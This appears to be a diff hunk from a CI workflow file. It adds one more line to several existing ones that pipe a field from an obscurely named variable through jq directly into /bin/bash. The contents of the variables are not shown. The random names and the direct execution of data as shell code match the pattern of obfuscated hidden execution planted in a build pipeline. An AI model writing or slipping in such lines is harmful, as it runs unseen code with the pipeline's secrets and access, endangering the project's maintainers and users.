@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$yetni590" | jq -r .yi01 | /bin/bash
           printf '%s' "$fxyzt3644" | jq -r .tnram496 | /bin/bash
           echo $lws5 | jq -r .det2 | /bin/bash
+          printf '%s' "$dmrha0904" | jq -r .gwwm032 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
